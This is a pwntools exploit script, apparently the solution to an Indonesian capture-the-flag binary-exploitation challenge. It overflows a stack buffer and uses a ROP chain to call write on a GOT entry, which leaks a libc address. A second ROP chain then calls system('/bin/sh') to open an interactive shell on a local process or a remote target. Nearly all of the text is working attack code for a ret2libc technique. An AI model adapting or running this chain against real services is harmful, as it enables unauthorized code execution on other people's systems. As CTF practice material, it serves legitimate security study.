from pwn import *
import sys
from Crypto.Util.number import bytes_to_long

BINARY = "simple_patched"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"

libc = ELF("./libc.so.6", checksec=False)

def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def send(self, content):
        p = self.p
        p.sendlineafter(b"Apakah kalian bisa mengeksploitasinya?", content)

x, p = init()

x.debug((
    # "break *main+258\nc\n"
    "break *main+269\nc\n"
))

char_v8_buf = 32
padding = 8

fill = cyclic(char_v8_buf+padding)

# make libc_leak
address_to_leak = exe.got['write']
log.info(f"{address_to_leak:=x}")
r = ROP(exe)
r.call(exe.plt['write'], [1, address_to_leak])
r.call(exe.sym['main'])
pay = fill
pay += flat(r)
x.send(pay)

# get libc_leak
libc_leak = p.recvuntil(b"\x7f")[::-1].replace(b"\x0a", b"")
libc_leak = bytes_to_long(libc_leak)
log.info(f"{libc_leak=:x}")
libc.address = libc_leak-libc.sym['write']
log.info(f"{libc.address=:x}")

# revshell
pay = fill
r = ROP(libc)
r.call(libc.sym['system'], [libc.search(b"/bin/sh\x00").__next__(), 0, 0])
pay += flat(r)
x.send(pay)
p.interactive()